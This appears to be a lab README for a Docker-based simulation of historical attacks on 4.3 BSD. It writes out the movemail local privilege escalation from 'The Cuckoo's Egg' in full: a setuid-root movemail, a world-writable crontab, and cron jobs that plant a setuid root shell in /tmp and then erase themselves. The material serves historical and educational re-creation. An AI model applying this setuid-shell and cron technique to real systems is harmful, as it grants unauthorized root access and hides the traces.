The Problem
===========

Sadly the 4.3 BSD version we are working with (provided by rapid7) have patched the original vulnerability where you could escaped to root shell by conducting buffer overflow with fingerd. 

The Solution
============

The solution, which is also provided by rapid7, is to use the movemail exploit from 'The Cuckoo's Egg'. 

On the local machine, meaning inside 4.3BSD, run the following commands:
```
cd /usr/src/contrib/emacs/etc
make movemail
cp movemail /etc
chmod 4755 /etc/movemail 
```

Notice that the setuid bit is set, meaning movemail, when executed, will run with privileges of the owner of the file. That is, if the file is owned by root, then it is run as root.

On the remote shell (one you get from smashing the stack), run the following commands: 
```
(umask 0 && /etc/movemail /dev/null /usr/lib/crontab.local)
(echo "* * * * * root cp /bin/sh /tmp && chmod u+s /tmp/sh"; echo  "* * * * * root rm -f /usr/lib/crontab.local") > /usr/lib/crontab.local
/tmp/sh
```

Because the setuid bit is set for movemail, which is owned by root, the movemail will run as root. The movemail creates 
the crontab file that is world writable (umask 0 bit), allowing even the user `nobody` to write into the file. 
Then, `nobody` writes cronjobs into crontab, which first copies the shell with setuid bit set and deletes the malicious crontab. Because cronjob is ran by root, the copy will be done using root's permissions, creating a shell that will give any user that runs it root permissions. 

Docker
======

Because we are relying upon docker images and docker compose to create virtual network of computers, we can modify the container to have the movemail exploit and then commit it as a image.

1. Run the aforementioned local commands to create vulnerable movemail
2. Shutdown the simulation, which should shutdown the container as well
3. run `docker ps -a` to get the container ID of the container with the movemail vulnerability 
4. run `docker commit <container_id> 4.3bsd_w_movemail` to commit the container as image with tag `4.3bsd_w_movemail`
5. Use this image in docker compose file instead of the ye-olde-bsd image
6. confirm that movemail is in new containers by running `ls /etc/movemail`
